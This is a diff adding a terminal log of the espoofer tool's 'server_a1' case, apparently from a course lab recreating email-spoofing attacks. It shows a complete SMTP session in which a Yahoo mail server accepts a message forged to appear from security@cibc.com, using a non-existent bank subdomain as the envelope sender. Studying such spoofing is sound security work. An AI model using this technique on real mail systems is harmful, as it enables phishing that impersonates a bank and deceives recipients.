@@ -1,0 +1,52 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a1
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('67.195.204.79', 25)
+>>> 220 mtaproxy202.free.mail.bf1.yahoo.com ESMTP ready
+
+<<< ehlo helo.testdomaintest.company
+
+>>> 250-mtaproxy202.free.mail.bf1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <any@mailfrom.notexist.cibc.com>
+
+>>> 250 sender <any@mailfrom.notexist.cibc.com> ok
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 recipient <cis6510victim@yahoo.com> ok
+
+<<< data
+
+>>> 354 go ahead
+
+<<< From: <security@cibc.com>
+To: <cis6510victim@yahoo.com>
+Subject: A1: Non-existent subdomain
+Date: Tue, 24 Nov 2020 04:44:07 +0000
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-LAX8AN@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 250 ok dirdel
+
+<<< quit
+
+>>> 221 2.0.0 Bye
+
+Finished.
